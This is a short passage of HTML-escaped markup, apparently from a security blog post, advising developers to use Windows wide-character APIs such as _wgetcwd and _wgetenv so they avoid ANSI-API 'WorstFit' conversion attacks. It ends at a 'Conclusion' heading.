+&lt;p&gt;&lt;strong&gt;As a developer&lt;/strong&gt;, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetcwd&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetenv&lt;/code&gt;&lt;/a&gt;. Otherwise, the underlying implementation can still call the ANSI API, which is vulnerable to our WorstFit attacks, too!&lt;/p&gt;
 
 &lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
 
